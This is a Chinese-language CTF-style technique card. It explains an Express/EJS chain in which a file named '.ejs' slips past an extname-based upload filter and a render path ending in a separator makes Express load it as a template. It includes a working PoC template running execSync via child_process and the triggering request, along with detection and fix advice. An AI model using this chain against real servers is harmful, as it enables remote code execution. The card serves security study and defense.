---
id: web-nodejs-ssti-ejs-extname-empty-render-default-engine-rce
title: EJS 上传/渲染双后缀检查绕过：文件名 .ejs 让 extname 返回空 + render 路径以分隔符结尾让 View 补 .ejs 渲染上传模板 RCE
type: scenario
domain: web
path: web/nodejs/ssti
technique: ejs-extname-empty-default-engine-render-bypass
aliases:
- extname('.ejs') 为空绕过后缀过滤
- Express View 默认引擎补全 .ejs
- render 路径结尾斜杠绕过 endsWith 检查
- CISCN ezjs 方法三
- EJS 上传 getshell
tags:
- nodejs
- express
- ejs
- ssti
- file-upload
- filter-bypass
- extname
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V295
  verified_at: '2026-11-08T08:20:33+08:00'
  notes: 已完整读 content.md 与全部23张图核对：图17 multer fileFilter用path.extname(file.originalname)=='.ejs'；图18 Node文档extname对点开头/无点最后一段返回空串；图19 render路由filePath.endsWith('.ejs')检查；图20/21 View无ext时补defaultEngine('.ejs')且fileName+=ext；图22 fileName=name；图23 URL http://127.0.0.1:3000/render?filename=/ 成功弹出计算器。卡内上传文件名.ejs绕过、filename=/使path.join结果以分隔符结尾绕过endsWith、View补.ejs解析uploads/.ejs、EJS <%= process.mainModule.require(...) %> 执行均与原文/图一致（原文正文写传\，截图实为/，卡内两者都写明）。单卡原子(extname空串+默认引擎补全双绕过)，粒度合适。dedup最高分为卡自身exact自匹配；与同文express-view-ext-require卡为View构造函数两个分支，dup-scan verdict=related，裁决并列保留；其余EJS SSTI类为不同注入点/链。无组件版本，未set-versions。未验证点：未在本地复跑Node环境。
---

## 一句话结论

Node `path.extname('.ejs')` 返回空字符串，因此只按 `extname(file.originalname) === '.ejs'` 拦截的上传过滤器允许文件名恰好为 `.ejs` 的文件落盘；渲染路由只检查 `filePath.endsWith('.ejs')`，传一个以路径分隔符结尾的 `filename` 让 `path.join` 结果不以 `.ejs` 结尾，而 Express `View` 对无扩展名的路径默认补 `.ejs` 并解析到刚上传的 `.ejs` 文件，最终 EJS 模板里的 `<%= ... %>` 执行命令。

## 原理

- 上传过滤逻辑：

  ```js
  fileFilter: (req, file, cb) => {
      const fileExt = path.extname(file.originalname).toLowerCase();
      if (fileExt === '.ejs') return cb(new Error('Upload of .ejs files is not allowed'), false);
      cb(null, true);
  }
  ```

  Node 官方文档对 `path.extname` 的说明：如果路径最后一段没有 `.`，或者最后一段以 `.` 开头，则返回空字符串（`extname('.ejs') === ''`）。文件名 `.ejs` 的最后一段以点开头，扩展名为空，过滤器判定「不是 .ejs」并放行；文件以原名 `.ejs` 存进 `uploads/`（multipart 的 `filename` 只含 `.ejs` 时，服务端保存为 `.ejs`）。
- 渲染路由逻辑：

  ```js
  const filePath = path.join(__dirname, 'uploads', filename);
  if (filePath.endsWith('.ejs')) return res.status(400).send('Invalid file type.');
  res.render(filePath);
  ```

  传 `filename=/`：`path.join(__dirname,'uploads','/')` 在 Windows 上归一化为以 `\` 结尾的绝对路径（Linux 上以 `/` 结尾），`endsWith('.ejs')` 为 false，绕过「禁止渲染 .ejs」的检查；`res.render` 收到的是「指向 uploads 目录、以分隔符结尾」的路径。
- Express `View` 的默认引擎补全：

  ```js
  this.ext = extname(name);       // 路径以分隔符结尾 -> extname 返回 ''
  var fileName = name;
  if (!this.ext) {
      this.ext = this.defaultEngine[0] !== '.' ? '.' + this.defaultEngine : this.defaultEngine; // '.ejs'
      fileName += this.ext;        // name + '.ejs'
  }
  ...
  this.path = this.lookup(fileName);
  ```

  因为 `app.set('view engine','ejs')`，`defaultEngine='ejs'`，`View` 把 `this.ext` 补成 `.ejs`，并把 `fileName` 变成 `<...>/uploads/.ejs`——正好是上传的文件。`lookup` 找到后，EJS 引擎编译执行该模板。
- EJS 模板里可直接写 Node.js 表达式，例如：

  ```ejs
  <%= process.mainModule.require('child_process').execSync('calc') %>
  ```

  `<%= %>` 在服务端求值，`process.mainModule.require` 拿到 `child_process`，命令执行；文章在 Windows 上弹出计算器，Linux 可换 `id`/反弹 shell。
- 该链的本质是两个「extname/后缀检查」语义差异叠加：
  - 上传侧：`extname('.ejs')` 为空，黑名单判断失效；
  - 渲染侧：`endsWith('.ejs')` 只看字符串末尾，而 `path.join` 产生的「目录 + 分隔符」路径不以 `.ejs` 结尾；Express 随后又用同一 `extname` 把空扩展名补成默认 `.ejs`。检查与实际解析用的不是同一套语义，形成绕过。

## 触发条件

- Express 应用设置 `app.set('view engine','ejs')`（EJS 为默认引擎），且存在上传接口把文件落到 `uploads/`（或任何可被 render 路径访问的目录）。
- 上传过滤器只用 `path.extname(originalname)` 判断 `.ejs` 黑名单，未检查 basename/首字符/内容。
- 渲染路由把用户可控 `filename` 拼进 `path.join` 后只做 `endsWith('.ejs')` 检查，再 `res.render(filePath)`。
- 目标为 Windows（`\` 分隔符）或 Linux（`/` 分隔符）均可：关键是 `path.join` 结果以分隔符结尾、`extname` 为空、`View` 补默认引擎。
- 上传目录可写、EJS 模板无沙箱限制（默认 EJS 允许 `process`/`require`）。

## 利用步骤

1. 上传文件名恰为 `.ejs` 的文件（multipart 的 `filename=".ejs"`），内容为 EJS 命令执行模板；过滤器因 `extname('.ejs')===''` 放行，文件保存为 `uploads/.ejs`。
2. 请求 `/render?filename=/`（Windows 也可用 `filename=\` 或编码后的分隔符）。`path.join` 生成以分隔符结尾的路径，`endsWith('.ejs')` 为 false，通过检查。
3. `res.render` 构造 `View`：`extname` 为空 → `defaultEngine='ejs'` → `fileName += '.ejs'` → 解析到 `uploads/.ejs` → EJS 渲染执行 `<%= ... %>`。
4. 验证命令执行（弹计算器/写文件/回连）；若无回显，把命令输出写到 Web 可访问文件或使用外带。
5. 若 `filename=/` 被规范化掉尾部斜杠，改用 `filename=\`（Windows）或 `filename=%2f`/`filename=.%2f` 等变体，目标是让 `path.join` 结果末尾保留分隔符且 `endsWith('.ejs')` 为 false。

## PoC

上传文件名：`.ejs`，内容：

```ejs
<!DOCTYPE html>
<html lang="en">
<head></head>
<body>
    <div>
        <%= process.mainModule.require('child_process').execSync('calc') %>
    </div>
</body>
</html>
```

触发：

```http
GET /render?filename=/ HTTP/1.1
Host: 127.0.0.1:3000
```

Windows 下 `path.join(__dirname,'uploads','/')` 得到 `C:\...\ezjs\uploads\`，`endsWith('.ejs')` 为 false；`View` 把它补成 `C:\...\ezjs\uploads\.ejs` 并渲染，`calc` 被执行（文章截图弹出计算器）。Linux 下把命令换成 `id` 并观察响应/外带。

## 变体与关联

- 上传侧变体：文件名 `.ejs`、`.ejs.`、`.EJS`（配合 `toLowerCase`）、空扩展名；任何依赖 `extname` 做黑名单的过滤都可能被「点开头文件名」绕过。
- 渲染侧变体：`filename=/`、`filename=\`、末尾 `%2f`、`uploads/.` 等，让 `endsWith` 检查与 `View` 实际解析路径不一致；若路由用 `path.resolve` 而非 `path.join`，效果可能不同。
- 关联：同文章另一张 Express View 扩展名→require 卡，利用 `ext` 非空时 `require(mod)` 加载任意模块；本卡利用 `ext` 为空时补默认引擎，两者是 View 构造函数的两个分支。
- 关联：`web/nodejs/ssti` 下「Express PUT 任意文件写入 + res.render(templ) 模板名可控」需要模板名可控；本卡的模板名是固定 `.ejs`（靠补齐），入口是上传文件内容。

## 检测与防御

- 修复：上传校验不要只用 `path.extname`，应取 `path.basename` 后检查是否以 `.ejs` 结尾、是否以点开头，并做内容/魔数校验；模板文件与上传目录分离，上传目录禁止作为 view root。
- 渲染校验：`res.render` 的路径应 `path.resolve` 后校验 `startsWith(viewsDir)`，并显式检查扩展名（同时覆盖末尾分隔符、大小写、编码）；禁止把用户输入直接作为模板路径。
- 部署：EJS 渲染不可信模板时使用沙箱/受限上下文（禁用 `process`、`require`）；上传目录只读或不可执行；`views` 目录只读。
- 检测：监控上传文件名为 `.ejs`/点开头/无扩展名的请求；监控 `res.render` 路径包含分隔符结尾或用户输入的请求；对 EJS 模板中出现 `process.mainModule`/`child_process`/`require` 的告警；检查 `uploads` 下异常 `.ejs` 文件。
- 排查：审计上传与渲染路由的参数校验是否使用同一路径语义；核对 Web 访问日志中 `/render?filename=` 的异常值。
